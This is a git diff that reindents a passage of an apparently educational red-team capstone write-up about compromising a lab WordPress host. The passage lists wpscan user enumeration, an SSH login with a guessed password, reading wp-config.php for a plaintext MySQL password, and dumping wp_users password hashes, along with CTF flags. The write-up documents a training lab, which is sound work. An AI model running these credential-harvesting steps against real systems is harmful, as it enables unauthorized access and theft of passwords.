@@ -50,33 +50,33 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 
 **Exploit**
 - User michael used their username as their password
-  - `wpscan –-url http://192.168.1.110/wordpress -eu`
-  - [Users Identified](https://github.com/joshblack07/UR-Cyber-Security-Capstone-3/blob/main/Resources/Kali_Users_Identified.PNG "Users Identified")
-  - `ssh michael@192.168.1.110`
-  - [login as michael](https://github.com/joshblack07/UR-Cyber-Security-Capstone-3/blob/main/Resources/kali_login_michael.PNG "Login_Michael")
+- `wpscan –-url http://192.168.1.110/wordpress -eu`
+- [Users Identified](https://github.com/joshblack07/UR-Cyber-Security-Capstone-3/blob/main/Resources/Kali_Users_Identified.PNG "Users Identified")
+- `ssh michael@192.168.1.110`
+- [login as michael](https://github.com/joshblack07/UR-Cyber-Security-Capstone-3/blob/main/Resources/kali_login_michael.PNG "Login_Michael")
 
 **Flag #2**
 -  Flag #2 {fc3fd58dcdad9ab23faca6e9a36e581c} 
-  - `cd /var/www`
-  - `cat flag2.txt`
-  - [Flag 2](https://github.com/joshblack07/UR-Cyber-Security-Capstone-3/blob/main/Resources/kali_michael_flag2.PNG "Flag 2")
+- `cd /var/www`
+- `cat flag2.txt`
+- [Flag 2](https://github.com/joshblack07/UR-Cyber-Security-Capstone-3/blob/main/Resources/kali_michael_flag2.PNG "Flag 2")
 
 **Flag #1**
 - Flag #1 {b9bbcb33e11b80be759c4e844862482d}
-  - `grep -RE flag html`
-  - [Flag 1](https://github.com/joshblack07/UR-Cyber-Security-Capstone-3/blob/main/Resources/kali_michael_flag1.PNG "Flag 1")
+- `grep -RE flag html`
+- [Flag 1](https://github.com/joshblack07/UR-Cyber-Security-Capstone-3/blob/main/Resources/kali_michael_flag1.PNG "Flag 1")
 
 **Exploit**
 - MySQL server login credentials in plain text found in wp-config.php file.
-  - `cat /var/www/html/wordpress/wp-config.php`
-    - Password: R@v3nSecurity
+- `cat /var/www/html/wordpress/wp-config.php`
+  - Password: R@v3nSecurity
   - [MySQL DB Password](https://github.com/joshblack07/UR-Cyber-Security-Capstone-3/blob/main/Resources/kali_MySQL_DB_password.PNG "MySQL DB Password")
 
 **Exploit**
 - MySQL server login credentials in plain text found in wp-config.php file.
-  - `mysql -u root -p`
-  - `mysql> use wordpress;`
-  - `mysql> select * from wp_users;`
+- `mysql -u root -p`
+- `mysql> use wordpress;`
+- `mysql> select * from wp_users;`
   - Password: R@v3nSecurity
   - [user password hashes](https://github.com/joshblack07/UR-Cyber-Security-Capstone-3/blob/main/Resources/kali_MySQL_wp_users.PNG "user password hashes")
 
